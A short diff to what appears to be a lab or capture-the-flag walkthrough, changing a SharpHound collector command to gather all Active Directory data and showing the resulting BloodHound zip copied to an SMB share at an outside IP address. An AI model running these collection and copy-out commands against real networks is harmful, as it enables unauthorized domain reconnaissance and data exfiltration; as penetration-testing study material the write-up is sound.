@@ -236,7 +236,7 @@ SharpHound.exe
 Run the "Collector" (SharpHound.exe) and copy the zip file back to the SMB share
 
 ```
-./SharpHound.exe
+./SharpHound.exe -c all
 
 copy 20220911135329_BloodHound.zip \\10.10.16.17\smb
 ```
